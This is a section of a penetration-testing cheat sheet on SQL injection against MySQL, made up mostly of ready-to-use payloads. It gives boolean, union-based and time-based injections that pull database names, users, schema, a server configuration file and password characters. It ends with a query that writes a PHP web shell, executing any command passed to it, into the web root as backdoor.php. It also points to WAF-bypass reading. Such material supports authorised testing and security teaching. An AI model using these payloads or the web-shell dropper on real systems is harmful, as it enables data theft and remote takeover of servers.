### SQL Injection

**The following examples were tested on MySQL database.**

Try to produce database errors by injecting a single-quote, back-slash, double-hyphen, forward-slash, or period.

Boolean-based SQLi:

```fundamental

' OR 1=1--

' OR 1=2--

```

**Note that MySQL requires a space between the comment symbol and the next character.**

Union-based SQLi:

```fundamental

' UNION SELECT 1, 2, 3, 4--

' UNION SELECT 1, concat_ws(' | ', database(), current_user(), version()), 3, 4--

' UNION SELECT 1, concat_ws(' | ', table_schema, table_name, column_name, data_type, character_maximum_length), 3, 4 FROM information_schema.columns--

' UNION SELECT 1, load_file('..\\..\\apache\\conf\\httpd.conf'), 3, 4--

```

Use the union-based SQLi only when you are able to use the same communication channel to both launch the attack and gather results.

The goal is to determine the exact number of columns in the application query and to figure out which of them are displaying to the user.

Time-based SQLi:

```fundamental

' AND (SELECT 1 FROM (SELECT sleep(2)) test)--

' AND (SELECT 1 FROM (SELECT CASE user() WHEN 'root@127.0.0.1' THEN sleep(2) ELSE sleep(0) END) test)--

' AND (SELECT 1 FROM (SELECT CASE substring(current_user(), 1, 1) WHEN 'r' THEN sleep(2) ELSE sleep(0) END) test)--

' AND (SELECT CASE substring(password, 1, 1) WHEN '$' THEN sleep(2) ELSE sleep(0) END FROM schema.users WHERE id = 1)--

' AND IF(version() LIKE '5%', sleep(2), sleep(0))--

```

Use the time-based SQLi when you are not able to see the results.

Inject a [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get.php) based on HTTP GET request:

```fundamental

' UNION SELECT '', '', '', '<?php $p="command";$o=null;if(isset($_SERVER["REQUEST_METHOD"])&&strtolower($_SERVER["REQUEST_METHOD"])==="get"&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$o=@shell_exec("($_GET[$p]) 2>&1");if($o===false){$o="ERROR: The function might be disabled.";}else{$o=str_replace("<","&lt;",$o);$o=str_replace(">","&gt;",$o);}/*echo "<pre>{$o}</pre>";unset($o);unset($_GET[$p]);/*@gc_collect_cycles();*/} ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Simple PHP Web Shell</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><pre><?php echo $o;unset($o);unset($_GET[$p]);/*@gc_collect_cycles();*/ ?></pre></body></html>' INTO DUMPFILE '..\\..\\htdocs\\backdoor.php'--

```

To successfully inject a web shell, the current database user must have a write permission.

**Always make sure to properly close the surrounding code.**

Read this [article](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF) to learn how to bypass WAF.